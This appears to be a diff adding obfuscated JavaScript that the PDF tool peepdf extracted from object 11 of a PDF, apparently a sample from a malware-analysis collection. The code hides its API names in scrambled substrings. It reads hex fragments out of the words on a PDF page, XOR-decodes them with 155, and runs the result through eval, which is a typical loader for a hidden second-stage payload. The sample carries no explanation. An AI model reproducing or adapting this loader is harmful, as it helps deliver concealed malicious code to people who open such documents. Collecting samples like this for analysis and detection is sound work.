@@ -1,0 +1,40 @@
+// peepdf comment: Javascript code located in object 11 (version 0)
+
+var wT = String;
+var d = this;
+
+function n(t, h) {
+    return t ^ h;
+};
+var l = 155;
+var r = new String("getPMy6O".substr(0, 4) + "qTsageNqsT".substr(3, 4) + "umWovdUC".substr(0, 4) + "tSVrds".substr(3));
+var lI = String("6jFsubs".substr(3) + "PKJtrJPK".substr(3, 2));
+var qT = String("EhMgetP".substr(3) + "cq7ageN7cq".substr(3, 4) + "yT7thWo".substr(3) + "rd");
+var z = "fromC" + "harCo" + "cPjde".substr(3);
+var x = String("uneswESX".substr(0, 4) + "cape7loJ".substr(0, 4));;
+var p = new String("CWNchar".substr(3) + "CodeKf7u".substr(0, 4) + "6LdAt6dL".substr(3, 2));
+var pG = 1;
+var iJ = new String();
+var v = ["p", "", "p", "a"];
+xA = new String(v[3] + v[0] + v[0] + v[1]);
+var iT = ["l", "", "v", "e", "a"];
+vQ = new String(iT[3] + iT[2] + iT[4] + iT[0] + iT[1]);
+var mZ = 1566 - 1566;;
+var zU = 46 - 44;
+var uP = String("%");
+var f = 72 - 71;
+var xA = d[xA];;
+var hW = d[vQ];
+var cD = d[x];
+var vK = d[r](pG);
+for (var uB = mZ; uB < vK; uB += f) {
+    dU = d[qT](pG, uB);
+    var kF = dU[lI](dU.length - zU, zU);
+    var vO = uP + kF;
+    var iTA = cD(vO);
+    var wP = iTA[p](mZ);
+    var xW = n(wP, l);
+    iJ += wT[z](xW);
+}
+hW(iJ);
+
